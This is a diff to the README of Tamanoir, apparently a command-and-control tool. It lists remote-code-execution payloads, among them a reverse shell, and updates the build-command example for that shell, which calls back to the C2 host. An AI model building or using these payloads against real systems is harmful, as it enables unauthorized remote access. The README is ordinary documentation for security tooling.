@@ -30,7 +30,7 @@ Tamanoir comes with ready-to-use payloads :
 |----------|----------|----------|
 | hello |  prints a cute tamanoir to tamanoir stdout  | hello-world payload, demonstrate how a big payload can be transmitted by chunks to target|
 | xeyes | open `xeyes` program on target gui | demonstrate how to execute simple shellcode. Only works if target uses x11 |
-| reverse-shell | open a tcp-shell communicating with tamanoir-c2 | needs to specify IP and PORT vars when building (see below) 
+| reverse-shell | open a tcp-shell communicating with tamanoir-c2 | needs to specify IP var when building (see below) 
 
 
 ### 📍 payloads location: ./assets/payloads
@@ -54,7 +54,7 @@ Tamanoir comes with ready-to-use payloads :
 - ⚠ max payload size (once compiled and stripped) = 4096 bytes
 
 #### example: build reverse-shell 
-`tamanoir-c2  rce  build  -c ./assets/payloads/reverse-shell  -b "IP=<tamanoir-c2-ip> PORT=8082"`
+`tamanoir-c2  rce  build  -c ./assets/payloads/reverse-shell  -b "IP=<tamanoir-c2-ip>" -t x86_64`
 will compile `reverse-shell` payload:
 - for x86_64 target arch 
 - use cross to build it if current arch isn't x86_64
@@ -68,6 +68,10 @@ will compile `reverse-shell` payload:
 - ⚠ path needs to be absolute
 
 ## ⚠ Limitations
-Though it is  possible to compile payloads for `x86_64` and `aarch64` architectures, currently only `x86_64` target arch is viable for provided payloads.
-Any contributions from people knowledgable about aarch64 assembly code are welcome! (see open issues for context)
+- Cross compilation is only available  for `aarch64` ->  `x86_64` 
+- Rce payloads are for now only available for GNU toolchain
+
+
+
+
 
